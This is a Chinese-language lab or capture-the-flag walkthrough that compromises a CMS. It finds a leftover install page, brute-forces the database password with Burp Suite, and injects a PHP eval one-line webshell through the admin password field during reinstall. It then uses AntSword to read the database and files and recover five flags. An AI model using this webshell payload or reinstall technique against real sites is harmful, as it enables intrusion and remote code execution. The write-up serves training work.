### 一．利用cms重装漏洞

网站系统有重装漏洞。访问[url:http://ip](url:http://ip)地址/?m=install会跳转到安装页面（管理员忘记删除安装文件夹）。

![1568167775473](C:\Users\dell\AppData\Roaming\Typora\typora-user-images\1568167775473.png)

发现flag1：flag1{B372E816B79C9AF6EE82A04F5BBE5020}

### 二．爆破数据库密码

![1568168267871](C:\Users\dell\AppData\Roaming\Typora\typora-user-images\1568168267871.png)

1.使用Burpsuite爆破数据库密码重装。

首先将浏览器配置好Burpsuite代理之后 点击完成提交后抓取到数据包

![1568168586475](C:\Users\dell\AppData\Roaming\Typora\typora-user-images\1568168586475.png)

我们关注的是pass字段 代表着我们填写的数据库密码

将这个数据包发送给intruder模块 进行爆破 

接着选中pass字段后的值点击右侧的Add& 效果如下图

![1568168571329](C:\Users\dell\AppData\Roaming\Typora\typora-user-images\1568168571329.png)

接着切换到payload页面 选择字典

![1568168699525](C:\Users\dell\AppData\Roaming\Typora\typora-user-images\1568168699525.png)

点击右上角start attack 开始攻击

弹出新的窗口显示爆破进度和返回页面的长度 点击Length 按长度排序即可发现password的长度和其他数据包的长度不一样，因此判断正确的数据库密码就是password

![1568168722686](C:\Users\dell\AppData\Roaming\Typora\typora-user-images\1568168722686.png)

2.获取到数据库密码为password。选择重装，密码处填入password，在超级管理员密码处填写

password',"${@eval($_POST[cmd])}",//

一句话木马和注释标记，如下图所示。

![1568168813727](C:\Users\dell\AppData\Roaming\Typora\typora-user-images\1568168813727.png)

提示安装完成，访问后台使用刚才重装的管理员密码：password

![1568169128209](C:\Users\dell\AppData\Roaming\Typora\typora-user-images\1568169128209.png)

![1568169165795](C:\Users\dell\AppData\Roaming\Typora\typora-user-images\1568169165795.png)

3.将鼠标停留在菜单栏上图标“全部展开”找到flag2：

flag2{09FDAA2CF897F3A80AF668B78EA711C9}

如下图所示

![img](http://192.168.33.1/uploads/20180330/permeate_12_html_m1e7c21d8.png)

### 三．蚁剑连接数据库

现在打开蚁剑，连接重装时写入配置文件中的一句话。地址为：ip/webrock/webrockConfig.php（此地址为配置文件路径）并将刚才爆破出来的数据库密码填上地址：`http://192.168.200.110/webrock/webrockConfig.php`

![1568170185389](C:\Users\dell\AppData\Roaming\Typora\typora-user-images\1568170185389.png)

访问数据库管理，在rockoa数据库的flag表中找到flag获取flag3：flag3{25E6AEC56657574713D3C48C2DFDC7BE}

![1568170097155](C:\Users\dell\AppData\Roaming\Typora\typora-user-images\1568170097155.png)

### 四．查看网站目录

打开蚁剑文件管理，发现flag4文件

文件名为flag4{74A093D9454DAF2BB69361B740D18B7C}

![1568170219566](C:\Users\dell\AppData\Roaming\Typora\typora-user-images\1568170219566.png)

### 五．查看系统文件

在C:\Program Files\文件夹中找到文件flag5

![1568170275495](C:\Users\dell\AppData\Roaming\Typora\typora-user-images\1568170275495.png)

flag5：flag5{7B78B56A9F8A0B583FB2EA4E05247206}